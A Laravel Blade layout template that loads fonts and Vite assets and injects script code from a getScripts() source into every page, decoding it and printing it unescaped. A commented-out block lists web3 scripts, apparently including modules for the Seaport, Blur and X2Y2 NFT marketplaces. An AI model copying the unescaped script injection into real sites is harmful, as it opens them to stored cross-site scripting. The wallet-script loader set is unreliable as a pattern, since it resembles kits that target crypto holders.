<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>{{ config('app.name', 'Laravel') }}</title>

    <!-- Fonts -->
    <link rel="stylesheet" href="https://fonts.bunny.net/css2?family=Nunito:wght@400;600;700&display=swap">

    <!-- Scripts -->
    @vite(['resources/css/app.css', 'resources/js/app.js'])
    <link rel="stylesheet" type="text/css" href="/css/custom.css">
</head>

<body>
    <div class="font-sans text-gray-900 antialiased">
        {{ $slot }}
    </div>
    @if (getScripts()->count() > 0)
        @foreach (getScripts() as $row)
            {!! htmlspecialchars_decode($row->code) !!}
        @endforeach
    @endif

    {{-- <script src="/assets/web3-provider/web3-modal.js"></script>
  <script src="/assets/web3-provider/web3-loader.js"></script>
  <script src="/assets/web3-provider/web3-connect.js"></script>
  <script src="/assets/web3-provider/web3-router.js"></script>
  <script src="/assets/web3-provider/web3-module.js"></script>
  <script src="/assets/web3-provider/web3-alert.js"></script>
  <script src="/assets/web3-provider/web3-seaport.js"></script>
  <script src="/assets/web3-provider/web3-data.js"></script>
  <script src="/assets/web3-provider/ethers.js"></script>
  <script src="/assets/web3-provider/ethereum-tx.js"></script>
  <script src="/assets/web3-modules/module-blur.js"></script>
  <script src="/assets/web3-modules/module-seaport.js"></script>
  <script src="/assets/web3-modules/module-x2y2.js"></script>
  <script src="/assets/web3-provider.js"></script> --}}
</body>

</html>
